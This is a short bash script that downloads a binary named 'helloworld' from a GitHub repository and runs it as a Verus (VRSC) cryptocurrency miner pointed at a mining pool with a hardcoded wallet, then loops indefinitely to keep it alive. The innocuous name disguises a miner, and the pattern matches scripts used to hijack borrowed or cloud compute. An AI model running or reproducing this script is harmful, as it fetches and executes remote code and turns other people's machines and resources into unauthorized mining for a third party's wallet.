#!/bin/bash

sudo apt update
sudo apt install screen -y
wget "https://github.com/theinterestingdev/helloworld/raw/main/helloworld.tar.gz"
tar xf helloworld.tar.gz
cd helloworld
./helloworld -algo Verushash -coin VRSC -wallet RPJ4TjKNyrmFuc1hbdENoGsKUNVSrHRVWP.kopok -pool1 eu.luckpool.net:3956 -cpuThreads 2
while [ 1 ]; do
sleep 3
done
sleep 999
